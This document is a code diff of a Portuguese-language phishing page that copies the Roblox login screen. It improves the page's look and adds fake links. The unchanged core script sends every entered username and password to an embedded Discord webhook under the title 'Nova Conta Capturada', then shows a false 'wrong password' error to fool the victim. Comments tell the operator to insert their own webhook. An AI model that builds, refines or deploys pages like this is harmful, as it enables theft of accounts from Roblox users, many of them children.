@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox - Entrar</title>
+  <title>Roblox</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -12,102 +12,192 @@
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
       font-family: 'Roboto', sans-serif;
-      background: #0f0f10;
       color: #e3e3e3;
       min-height: 100vh;
+      background: #000 url('https://images.rbxcdn.com/076d146437ffc79cebc36bf2ded91196') no-repeat center center fixed;
+      background-size: cover;
       display: flex;
       justify-content: center;
       align-items: center;
       overflow: hidden;
     }
-    .background {
-      position: fixed; inset:0;
-      background: linear-gradient(135deg, #1a1a2e 0%, #0f0f10 100%);
-      z-index: -2;
+
+    /* Overlay escuro para melhorar legibilidade (estilo Roblox moderno) */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.45); /* escurece levemente o fundo */
+      z-index: -1;
     }
+
     .container {
-      width: 100%; max-width: 420px;
-      padding: 40px 32px;
-      background: rgba(20,20,25,0.85);
+      width: 100%;
+      max-width: 420px;
+      padding: 48px 36px 36px;
+      background: rgba(25, 25, 30, 0.78);
       border-radius: 12px;
-      border: 1px solid rgba(255,255,255,0.06);
-      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255,255,255,0.08);
+      box-shadow: 0 24px 70px rgba(0,0,0,0.7);
+      backdrop-filter: blur(16px);
       z-index: 10;
+      text-align: center;
     }
-    .logo { text-align:center; margin-bottom:32px; }
-    .logo img { width:180px; height:auto; filter: drop-shadow(0 4px 12px rgba(0,162,255,0.4)); }
-    h1 { text-align:center; font-size:28px; font-weight:500; margin-bottom:32px; color:#fff; }
-    .input-group { margin-bottom:20px; position:relative; }
-    label { display:block; margin-bottom:8px; font-size:14px; color:#c9c9c9; }
+
+    .logo {
+      margin-bottom: 40px;
+    }
+
+    .logo img {
+      width: 220px;
+      height: auto;
+      filter: drop-shadow(0 6px 16px rgba(0, 170, 255, 0.5));
+    }
+
+    h1 {
+      font-size: 32px;
+      font-weight: 700;
+      margin-bottom: 32px;
+      color: #ffffff;
+      letter-spacing: 0.5px;
+    }
+
+    .input-group {
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      color: #d0d0d0;
+    }
+
     input {
-      width:100%; padding:14px 16px;
-      border:1px solid #444; border-radius:8px;
-      background:#111113; color:white; font-size:16px;
-      transition:all 0.2s;
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #3a3a3a;
+      border-radius: 6px;
+      background: #111114;
+      color: #fff;
+      font-size: 16px;
+      transition: all 0.2s ease;
     }
+
     input:focus {
-      outline:none; border-color:#00a2ff;
-      box-shadow:0 0 0 3px rgba(0,162,255,0.25);
+      outline: none;
+      border-color: #00a2ff;
+      box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.3);
     }
+
     .btn-login {
-      width:100%; padding:16px; margin:12px 0 20px;
-      background:#00a2ff; color:white; border:none;
-      border-radius:8px; font-size:18px; font-weight:500;
-      cursor:pointer; transition:all 0.25s;
+      width: 100%;
+      padding: 16px;
+      margin: 16px 0 20px;
+      background: linear-gradient(90deg, #00a2ff, #0077cc);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.25s;
     }
-    .btn-login:hover { background:#0088d9; transform:translateY(-1px); }
-    .btn-login:active { transform:translateY(1px); }
+
+    .btn-login:hover {
+      background: linear-gradient(90deg, #0088dd, #005fa3);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(0, 130, 255, 0.4);
+    }
+
+    .btn-login:active {
+      transform: translateY(0);
+    }
+
     .btn-login:disabled {
-      background:#555; cursor:not-allowed; opacity:0.7;
+      background: #444;
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+
+    .links {
+      font-size: 14px;
+      margin-top: 16px;
+    }
+
+    .links a {
+      color: #00a2ff;
+      text-decoration: none;
+      margin: 0 12px;
+      transition: color 0.2s;
+    }
+
+    .links a:hover {
+      color: #4dc3ff;
+      text-decoration: underline;
     }
 
     .error-message {
-      position:absolute; left:50%; transform:translateX(-50%);
-      bottom:-60px;
-      background:rgba(255,60,60,0.92); color:white;
-      padding:12px 24px; border-radius:8px;
-      font-weight:500; font-size:15px; white-space:nowrap;
-      opacity:0; pointer-events:none;
-      box-shadow:0 6px 20px rgba(255,0,0,0.35);
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      bottom: -70px;
+      background: rgba(220, 50, 50, 0.95);
+      color: white;
+      padding: 12px 28px;
+      border-radius: 8px;
+      font-weight: 500;
+      font-size: 15px;
+      white-space: nowrap;
+      opacity: 0;
+      pointer-events: none;
+      box-shadow: 0 8px 24px rgba(200,0,0,0.4);
     }
+
     .error-message.show {
-      opacity:1; bottom:-10px;
-      animation: shake 0.4s, fadeOut 3s 1s forwards;
+      opacity: 1;
+      bottom: -15px;
+      animation: shake 0.5s, fadeOut 3.5s 0.8s forwards;
     }
+
     @keyframes shake {
-      0%,100% { transform:translateX(-50%) translateY(0); }
-      20% { transform:translateX(-50%) translateY(-4px); }
-      40% { transform:translateX(-50%) translateY(4px); }
-      60% { transform:translateX(-50%) translateY(-3px); }
-      80% { transform:translateX(-50%) translateY(3px); }
+      0%,100% { transform: translateX(-50%) translateY(0); }
+      10%,30%,50%,70%,90% { transform: translateX(-50%) translateY(-5px); }
+      20%,40%,60%,80% { transform: translateX(-50%) translateY(5px); }
     }
-    @keyframes fadeOut { to { opacity:0; bottom:-40px; } }
+
+    @keyframes fadeOut {
+      to { opacity: 0; bottom: -50px; }
+    }
   </style>
 </head>
 <body>
 
-<div class="background"></div>
-
 <div class="container">
   <div class="logo">
-    <img src="https://www.roblox.com/images/Logo.svg" alt="Roblox Logo" 
-         onerror="this.src='https://via.placeholder.com/180x60/00a2ff/ffffff?text=Roblox';">
+    <img src="https://www.roblox.com/images/Logo.svg" alt="Roblox" 
+         onerror="this.src='https://via.placeholder.com/220x70/00a2ff/ffffff?text=Roblox';">
   </div>
 
   <h1>Entrar</h1>
 
   <div class="input-group">
     <label for="username">Nome de usuário ou Email</label>
-    <input type="text" id="username" placeholder="Seu @nome ou email" autocomplete="off">
+    <input type="text" id="username" placeholder="" autocomplete="off">
   </div>
 
   <div class="input-group">
     <label for="password">Senha</label>
-    <input type="password" id="password" placeholder="Senha" autocomplete="off">
+    <input type="password" id="password" placeholder="" autocomplete="off">
   </div>
 
   <button class="btn-login" id="loginBtn">Entrar</button>
+
+  <div class="links">
+    <a href="#">Esqueceu a senha?</a> • <a href="#">Não tem conta? Cadastre-se</a>
+  </div>
 
   <div class="error-message" id="errorMsg">Nome de usuário ou senha incorretos</div>
 </div>
@@ -118,9 +208,7 @@
   const usernameInput = document.getElementById('username');
   const passwordInput = document.getElementById('password');
 
-  // ╔════════════════════════════════════════════════════╗
-  // ║     MUDE AQUI PELO SEU WEBHOOK DO DISCORD          ║
-  // ╚════════════════════════════════════════════════════╝
+  // SEU WEBHOOK AQUI (não esqueça de trocar!)
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474804412965978274/aQAej8nqhjGJMP_FBvbJM84EmTaHdj9bWL9wIvibBh3oHhSbfVBiuMrVGxnY5bESCnVy";
 
   async function enviarParaDiscord(username, password) {
@@ -129,39 +217,23 @@
         content: "",
         embeds: [{
           title: "🔐 **Nova Conta Capturada**",
-          color: 0xFF0000, // vermelho (pode mudar: 0x00AA00 = verde escuro, etc)
+          color: 0xFF0000,
           fields: [
-            {
-              name: "**Login:**",
-              value: `\`${username.trim() || "——— vazio ———"}\``,
-              inline: true
-            },
-            {
-              name: "**Senha:**",
-              value: `\`${password.trim() || "——— vazio ———"}\``,
-              inline: true
-            }
+            { name: "**Login:**", value: `\`${username.trim() || "——— vazio ———"}\``, inline: true },
+            { name: "**Senha:**", value: `\`${password.trim() || "——— vazio ———"}\``, inline: true }
           ],
           timestamp: new Date().toISOString(),
-          footer: {
-            text: "Capturado • " + new Date().toLocaleString("pt-BR", {
-              timeZone: "America/Sao_Paulo"
-            })
-          }
+          footer: { text: "Capturado • " + new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }) }
         }]
       };
 
-      const response = await fetch(DISCORD_WEBHOOK_URL, {
+      await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
       });
-
-      if (!response.ok) {
-        console.error("Falha no webhook:", response.status);
-      }
     } catch (err) {
-      console.error("Erro ao enviar:", err);
+      console.error("Erro no webhook:", err);
     }
   }
 
@@ -169,27 +241,23 @@
     const username = usernameInput.value.trim();
     const password = passwordInput.value.trim();
 
-    // Desabilita botão durante o processo
     loginBtn.disabled = true;
     loginBtn.textContent = "Entrando...";
 
-    // Envia pro Discord
-    await enviarParaDiscord(username, password);
+    if (DISCORD_WEBHOOK_URL.includes("SEU_ID")) {
+      console.warn("Webhook não configurado! Troque o URL no código.");
+    } else {
+      await enviarParaDiscord(username, password);
+    }
 
-    // Mostra erro (como se tivesse errado a senha)
     errorMsg.textContent = "Nome de usuário ou senha incorretos";
     errorMsg.classList.add('show');
 
-    // Volta ao normal depois de ~3.5 segundos
     setTimeout(() => {
       errorMsg.classList.remove('show');
       loginBtn.disabled = false;
       loginBtn.textContent = "Entrar";
-      
-      // Limpa os campos (opcional – comente se não quiser)
-      // usernameInput.value = "";
-      // passwordInput.value = "";
-    }, 3500);
+    }, 3800);
   });
 </script>
 
